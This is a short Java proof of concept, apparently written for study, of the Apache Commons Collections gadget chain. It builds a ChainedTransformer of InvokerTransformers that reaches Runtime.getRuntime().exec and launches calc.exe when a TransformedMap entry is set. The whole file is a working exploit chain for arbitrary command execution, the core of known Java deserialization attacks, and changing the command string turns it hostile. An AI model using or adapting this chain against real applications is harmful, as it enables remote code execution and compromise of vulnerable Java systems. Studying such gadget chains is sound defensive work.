package com.answer.demo.analysis;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * created by liufeng
 * 2019/1/4
 */
public class SerializableBug {
    public static void main(String[] args) {
        Transformer[] transformers=new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[] {String.class, Class[].class },new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",new Class[] {Object.class, Object[].class },new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",new Class[] {String.class },new Object[]{"calc.exe"})
        };
        Transformer transformerChain=new ChainedTransformer(transformers);
        Map<String,String> map=new LinkedHashMap<>();
        map.put("1","sss");
        Map innerMap= TransformedMap.decorate(map,null,transformerChain);
        Map.Entry element= (Map.Entry) innerMap.entrySet().iterator().next();
        element.setValue("aaa");
    }
}
